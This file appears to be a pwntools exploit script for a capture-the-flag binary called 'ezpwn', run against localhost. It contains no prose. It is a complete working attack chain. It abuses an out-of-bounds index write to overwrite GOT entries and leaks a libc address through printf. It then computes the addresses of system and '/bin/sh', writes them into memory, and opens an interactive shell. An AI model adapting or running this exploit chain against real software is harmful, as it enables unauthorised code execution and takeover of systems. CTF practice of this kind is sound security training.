from pwn import *
from icecream import ic

elf = exe = ELF("./ezpwn")

context.binary = exe
context.log_level = "debug"
# context.aslr = False

def start(argv=[], *a, **kw):
    '''Start the exploit against the target.'''
    sys.argv += ' '
    if sys.argv[1] == 'r':
        args.REMOTE = True
    elif sys.argv[1] == 'd':
        args.GDB = True
    
    if args.REMOTE:
        return remote("localhost", 1337)
    if args.GDB:
        return gdb.debug([exe.path] + argv, gdbscript=gdbscript, *a, **kw)
    else:
        return process([exe.path] + argv, *a, **kw)

gdbscript = '''
b *0x0000000000401268
b *0x00000000004012b4
b *0x00000000004012df
b *0x00000000004012ee
b *0x0000000000401256
# b *0x0000000000401227
# b *0x0000000000401280
# b *0x00000000004012b4
# c
'''.format(**locals())

def sl(a): return io.sendline(a)
def s(a): return io.send(a)
def sa(a, b): return io.sendafter(a, b)
def sla(a, b): return io.sendlineafter(a, b)
def re(a): return io.recv(a)
def ru(a): return io.recvuntil(a)
def rl(): return io.recvline()
def i(): return io.interactive()

io = start()

main = 0x00000000004011f6
call_rax = 0x0000000000401014
ret = 0x00000000000040101a
idk = 0x10140000
ru("n =")
# sl(b"-9223372036854775808")
sl(b'-1')
ru("i =")
sl(b'1052678')
ru("=")
# sl(b'66666666'*1000+p64(main))
sl(str(main).encode())

ru("n =")
# sl(b"-9223372036854775808")
sl(b'-1')
ru("i =")
sl(b'1052690')
ru("=")
# sl(b'66666666'*1000+p64(main))
sl(str(call_rax).encode())

# ru("n =")
# # sl(b"-9223372036854775808")
# sl(b'-1')
# ru("i =")
# sl(b'1052678')
# ru("=")
# # sl(b'66666666'*1000+p64(main))
# sl(str(main).encode())


x = hex(elf.plt['printf'])
ic(x)
ru("n =")
sl(b'-1')
ru("i =")
sl(b'1052686')
ru("=")
sl(str(elf.plt['printf']).encode())


ru("n =")
sl(str(0x0000000000401278))
# ru("i =")
sl(b'1052687')
ru("=")
sl(b'0')

ru("n =")
sl(str(0x0000000000401278))
# ru("i =")
sl(b'1052690')
ru("=")
sl(str(ret).encode())

ru("n =")
sl(str(elf.got['printf']).encode())
libc_leak = u64(ru("i =")[1:-3].ljust(8, b'\x00'))
ic(hex(libc_leak))
libc_base = libc_leak - 0x606f0
sl(b'1052688')
ru("=")
sl(str(idk).encode())

system = libc_base + 0x50d70
# 0xebc81 0xebc85 0xebc88 0xebce2 0xebd38 0xebd3f 0xebd43
ic(hex(system))
part1 = int(str(hex(system)[2:-8]), 16)
part2 = int(str(hex(system)[6:]), 16)
ic(hex(part1))
ic(hex(part2))

binsh = libc_base + 0x1d8678

ru("n =")
sl(str(0x0000000000401278))
# ru("i =")
sl(b'1052687')
ru("=")
sl(str(part1).encode())

ru("n =")
sl(str(0x0000000000401278))
# ru("i =")
sl(b'1052686')
ru("=")
sl(str(part2).encode())

ru("n =")
sl(str(0x0000000000401278))
# ru("i =")
sl(b'1052719')
ru("=")
sl(str(u32(b'n/sh')).encode())

ru("n =")
sl(str(0x0000000000401278))
# ru("i =")
sl(b'1052718')
ru("=")
sl(str(u32(b'//bi')).encode())

ru("n =")
sl(str(0x0000000000401278))
# ru("i =")
sl(b'1052690')
ru("=")
sl(str(ret).encode())



ru("n =")
sl(str(4210872))
# ru("i =")
# sl(b'1052686')

# ru("n =")
# sl(str(binsh))

i()
